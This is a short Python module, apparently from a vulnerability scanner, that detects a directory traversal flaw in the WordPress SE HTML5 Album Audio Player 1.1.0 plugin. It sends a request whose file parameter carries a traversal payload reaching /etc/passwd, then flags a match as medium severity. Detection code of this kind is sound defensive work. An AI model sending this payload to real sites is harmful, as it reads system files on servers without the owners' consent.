#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress SE HTML5 Album Audio Player 1."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress SE HTML5 Album Audio Player 1.1.0 - Directory Traversal Detection',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/se-html5-album-audio-player/download_audio.php?file=/wp-content/uploads/../../../../../etc/passwd', allow_redirects=False)
        ...
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="WordPress SE HTML5 Album Audio Player 1.1.0 - Directory Traversal detected",
